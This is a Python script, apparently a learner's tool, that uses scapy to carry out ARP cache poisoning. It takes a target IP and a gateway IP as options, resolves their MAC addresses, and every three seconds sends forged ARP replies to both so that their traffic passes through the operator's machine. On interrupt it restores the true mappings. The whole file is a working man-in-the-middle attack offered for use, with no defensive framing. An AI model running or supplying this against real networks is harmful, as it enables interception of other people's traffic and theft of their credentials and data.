import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    arpRequestPacket = scapy.ARP(pdst=ip)

    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combinedPacket = broadcastPacket / arpRequestPacket
    answeredLists = scapy.srp(combinedPacket, timeout=1, verbose=False)[0]
    answeredLists.summary()

    return answeredLists[0][1].hwsrc


def arp_poisoning(targetIp, poisonedIp):
    targetMac = get_mac_address(targetIp)
    arpResponse = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=poisonedIp)
    scapy.send(arpResponse, verbose=False)


def reset_operation(fooled_Ip, gatewayIp):
    fooledMac = get_mac_address(fooled_Ip)
    gatewayMac = get_mac_address(gatewayIp)

    arpResponse = scapy.ARP(op=2, pdst=fooled_Ip, hwdst=fooledMac, psrc=gatewayIp, hwsrc=gatewayMac)
    scapy.send(arpResponse, verbose=False, count=6)


def get_user_input():
    parseObject = optparse.OptionParser()
    parseObject.add_option("-t", "--target", dest="targetIp", help="Enter Target IP")
    parseObject.add_option("-g", "--gateway", dest="gatewayIp", help="Enter Gateway IP")
    options = parseObject.parse_args()[0]

    if not options.targetIp:
        print("Enter Target IP!!!")
    if not options.gatewayIp:
        print("Enter Gateway IP!!!")

    return options

number = 0

userIps = get_user_input()
userTargetIp = userIps.targetIp
userGatewayIp = userIps.gatewayIp

try:
    while True:
        arp_poisoning(userTargetIp, userGatewayIp)
        arp_poisoning(userGatewayIp, userTargetIp)
        number += 2
        print("Sending packets:" + str(number))
        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(userTargetIp, userGatewayIp)
    reset_operation(userGatewayIp, userTargetIp)
